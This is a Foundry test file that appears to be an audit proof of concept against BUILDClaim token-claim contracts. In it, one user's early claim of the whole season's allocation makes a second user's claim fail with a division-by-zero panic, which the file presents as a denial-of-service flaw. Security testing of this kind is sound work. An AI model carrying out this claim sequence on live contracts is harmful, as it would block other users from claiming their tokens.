// File: test/PoCDivisionByZero.t.sol
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import {Test, stdError} from "forge-std/Test.sol";
import "forge-std/console.sol";

import {BUILDFactory} from "src/BUILDFactory.sol";
import {BUILDClaim} from "src/BUILDClaim.sol";
import {IBUILDFactory} from "src/interfaces/IBUILDFactory.sol";
import {IBUILDClaim} from "src/interfaces/IBUILDClaim.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IDelegateRegistry} from "@delegatexyz/delegate-registry/v2.0/src/IDelegateRegistry.sol";
import {MerkleProof} from "@openzeppelin/contracts/utils/cryptography/MerkleProof.sol";

contract MintableERC20 is ERC20 {
    constructor() ERC20("Mock Token", "MTK") {}
    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract StubRegistry is IDelegateRegistry {
    function checkDelegateForContract(address, address, address, bytes32) external view returns (bool) {
        return false;
    }
    function checkDelegateForAll(address, address, bytes32) external view returns (bool) {
        return false;
    }
    function checkDelegateForERC721(address, address, address, uint256, bytes32) external view returns (bool) {
        return false;
    }
    function checkDelegateForERC20(address, address, address, bytes32) external view returns (uint256) {
        return 0;
    }
    function checkDelegateForERC1155(address, address, address, uint256, bytes32) external view returns (uint256) {
        return 0;
    }
    function getIncomingDelegations(address) external view returns (Delegation[] memory delegations) {
        return delegations;
    }
    function getOutgoingDelegations(address) external view returns (Delegation[] memory delegations) {
        return delegations;
    }
    function getIncomingDelegationHashes(address) external view returns (bytes32[] memory delegationHashes) {
        return delegationHashes;
    }
    function getOutgoingDelegationHashes(address) external view returns (bytes32[] memory delegationHashes) {
        return delegationHashes;
    }
    function getDelegationsFromHashes(bytes32[] calldata) external view returns (Delegation[] memory delegations) {
        return delegations;
    }
    function multicall(bytes[] calldata) external payable returns (bytes[] memory) {
        bytes[] memory results;
        return results;
    }
    function delegateAll(address, bytes32, bool) external payable returns (bytes32) {
        return bytes32(0);
    }
    function delegateContract(address, address, bytes32, bool) external payable returns (bytes32) {
        return bytes32(0);
    }
    function delegateERC721(address, address, uint256, bytes32, bool) external payable returns (bytes32) {
        return bytes32(0);
    }
    function delegateERC20(address, address, bytes32, uint256) external payable returns (bytes32) {
        return bytes32(0);
    }
    function delegateERC1155(address, address, uint256, bytes32, uint256) external payable returns (bytes32) {
        return bytes32(0);
    }
    function readSlot(bytes32) external view returns (bytes32) {
        return bytes32(0);
    }
    function readSlots(bytes32[] calldata) external view returns (bytes32[] memory) {
        bytes32[] memory results;
        return results;
    }
}

contract PoCDivisionByZero is Test {
    BUILDFactory factory;
    MintableERC20 token;
    BUILDClaim claimContract;
    StubRegistry registry;

    address factoryAdmin = makeAddr("factoryAdmin");
    address projectAdmin = makeAddr("projectAdmin");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");

    uint256 constant SEASON_ID = 1;
    uint256 constant SEASON_TOKEN_AMOUNT = 1_000_000 ether;

    function setUp() public {
        vm.startPrank(factoryAdmin);
        registry = new StubRegistry();
        factory = new BUILDFactory(
            BUILDFactory.ConstructorParams({
                admin: factoryAdmin,
                maxUnlockDuration: 365 days,
                maxUnlockDelay: 365 days,
                delegateRegistry: registry
            })
        );
        vm.stopPrank();

        token = new MintableERC20();

        // Add project
        vm.startPrank(factoryAdmin);
        IBUILDFactory.AddProjectParams[] memory addParams = new IBUILDFactory.AddProjectParams[](1);
        addParams[0] = IBUILDFactory.AddProjectParams({
            token: address(token),
            admin: projectAdmin
        });
        factory.addProjects(addParams);
        vm.stopPrank();

        // Deploy claim contract
        vm.startPrank(projectAdmin);
        claimContract = BUILDClaim(address(factory.deployClaim(address(token))));
        vm.stopPrank();

        // Deposit funds
        token.mint(projectAdmin, SEASON_TOKEN_AMOUNT);
        vm.startPrank(projectAdmin);
        token.approve(address(claimContract), SEASON_TOKEN_AMOUNT);
        claimContract.deposit(SEASON_TOKEN_AMOUNT);
        vm.stopPrank();
    }

    function test_PoC_DivisionByZero() public {
        // 1. Configure a season with a Merkle tree for two users.
        uint256 user1Amount = SEASON_TOKEN_AMOUNT;
        uint256 user2Amount = 1 ether;

        bytes32 leaf1 = keccak256(abi.encodePacked(keccak256(abi.encode(user1, user1Amount, true, 0))));
        bytes32 leaf2 = keccak256(abi.encodePacked(keccak256(abi.encode(user2, user2Amount, false, 0))));

        bytes32 merkleRoot;
        if (leaf1 < leaf2) {
            merkleRoot = keccak256(abi.encodePacked(leaf1, leaf2));
        } else {
            merkleRoot = keccak256(abi.encodePacked(leaf2, leaf1));
        }

        vm.startPrank(factoryAdmin);
        uint256 unlockStart = block.timestamp + 1;
        factory.setSeasonUnlockStartTime(SEASON_ID, unlockStart);

        IBUILDFactory.ProjectSeasonConfig memory projectSeasonConfig = IBUILDFactory.ProjectSeasonConfig({
            tokenAmount: SEASON_TOKEN_AMOUNT,
            merkleRoot: merkleRoot,
            unlockDelay: 0,
            unlockDuration: 30 days,
            earlyVestRatioMinBps: 1000,
            earlyVestRatioMaxBps: 5000,
            baseTokenClaimBps: 5000,
            isRefunding: false
        });

        IBUILDFactory.SetProjectSeasonParams[] memory setParams = new IBUILDFactory.SetProjectSeasonParams[](1);
        setParams[0] = IBUILDFactory.SetProjectSeasonParams({
            seasonId: SEASON_ID,
            token: address(token),
            config: projectSeasonConfig
        });

        factory.setProjectSeasonConfig(setParams);
        vm.stopPrank();

        vm.warp(unlockStart);

        // 2. User1 performs an early claim for the entire season's token amount.
        bytes32[] memory proof1 = new bytes32[](1);
        proof1[0] = leaf2;
        vm.startPrank(user1);
        IBUILDClaim.ClaimParams[] memory claimParams = new IBUILDClaim.ClaimParams[](1);
        claimParams[0] = IBUILDClaim.ClaimParams({
            seasonId: uint32(SEASON_ID),
            isEarlyClaim: true,
            proof: proof1,
            maxTokenAmount: user1Amount,
            salt: 0
        });

        claimContract.claim(user1, claimParams);
        vm.stopPrank();

        // 3. Verify the state is now vulnerable.
        IBUILDClaim.GlobalState memory globalState = claimContract.getGlobalState(SEASON_ID);
        assertEq(globalState.totalLoyaltyIneligible, user1Amount, "Vulnerable state not reached");

        // 4. User2's subsequent claim will revert with a division-by-zero error.
        bytes32[] memory proof2 = new bytes32[](1);
        proof2[0] = leaf1;
        vm.startPrank(user2);
        IBUILDClaim.ClaimParams[] memory claimParams2 = new IBUILDClaim.ClaimParams[](1);
        claimParams2[0] = IBUILDClaim.ClaimParams({
            seasonId: uint32(SEASON_ID),
            isEarlyClaim: false,
            proof: proof2,
            maxTokenAmount: user2Amount,
            salt: 0
        });

        vm.expectRevert(abi.encodeWithSelector(bytes4(0x4e487b71), 0x12)); // Panic(uint256) with code for division by zero
        claimContract.claim(user2, claimParams2);

        console.log("SUCCESS: The test passed because the second claim reverted as expected, proving the DoS vulnerability.");
    }
}